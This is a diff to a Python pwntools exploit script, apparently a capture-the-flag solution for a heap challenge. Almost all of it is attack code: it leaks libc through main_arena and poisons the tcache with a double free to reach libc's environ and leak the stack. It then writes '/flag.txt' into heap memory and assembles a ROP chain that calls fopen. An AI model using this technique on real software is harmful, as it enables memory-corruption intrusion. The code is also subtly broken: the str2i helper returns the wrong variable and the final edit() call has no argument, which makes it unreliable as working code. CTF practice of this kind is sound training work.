@@ -45,6 +45,18 @@ def delete():
     ru("Index: ")
     sl("0")
 
+def str2i(string):
+    sum = 0
+    result = "";
+    for i in range(1, len(string)+1):
+        sum += ord(string[i-1])
+        if(i % 8 == 0):
+            result += p64(sum)
+            sum = 0
+        sum *= 0x100
+    result += p64(sum)
+    return sum
+
 for i in range(8):
     add(0x78)
 #chunk B
@@ -88,18 +100,51 @@ add(0x10)
 delete()
 show()
 main_arena_addr = u64(rl()[:6].ljust(8, '\0')) - 96
-
+libc_addr = main_arena_addr - 0x3ebc40
+log.info("libc address : " + hex(libc_addr))
 #symbols:
-pop_rdi = 0x2155f
-pop_rsi = 0x23e6a
-pop_rdx = 0x1b96
-push_rax = 0x3dfed
-read_addr = 0x110070
-fopen_addr = 0x7ee30
+pop_rdi = libc_addr + 0x2155f
+pop_rsi = libc_addr + 0x23e6a
+pop_rdx = libc_addr + 0x1b96
+push_rax = libc_addr + 0x3dfed
+read_addr = libc_addr + 0x110070
+fopen_addr = libc_addr + 0x7ee30
+environ = libc_addr + 0x3ee098
 
+add(0x10)
+delete()
+delete()
+edit(p64(environ))
+add(0x10)
+add(0x10)
+show()
+stack_addr = u64(rl()[:6].ljust(8, '\0'))
+log.info("Stack address : " + hex(stack_addr))
 
+add(0x10)
+delete()
+delete()
+show()
+string1_addr = u64(rl()[:6].ljust(8, "\0"))
+edit(str2i("/flag.txt"))
 
-free_hook_addr = main_arena_addr + 0x1ca8
-system_addr = main_arena_addr - 0x36d4d0
-log.info("free hook addr: " + hex(free_hook_addr))
-log.info("system addr: " + hex(system_addr))
+add(0x20)
+delete()
+delete()
+show()
+string2_addr = u64(rl()[:6].ljust(8, '\0'))
+edit(str2i("r"))
+
+add(0x78)
+delete()
+delete()
+show()
+flag_addr = u64(rl()[:6].ljust(8, '\0'))
+
+rop  = p64(pop_rdi) + p64(string1_addr) + p64(pop_rsi) + p64(string2_addr)
+rop += p64(fopen_addr)
+
+edit(p64(stack_addr))
+add(0x78)
+add(0x78)
+edit()
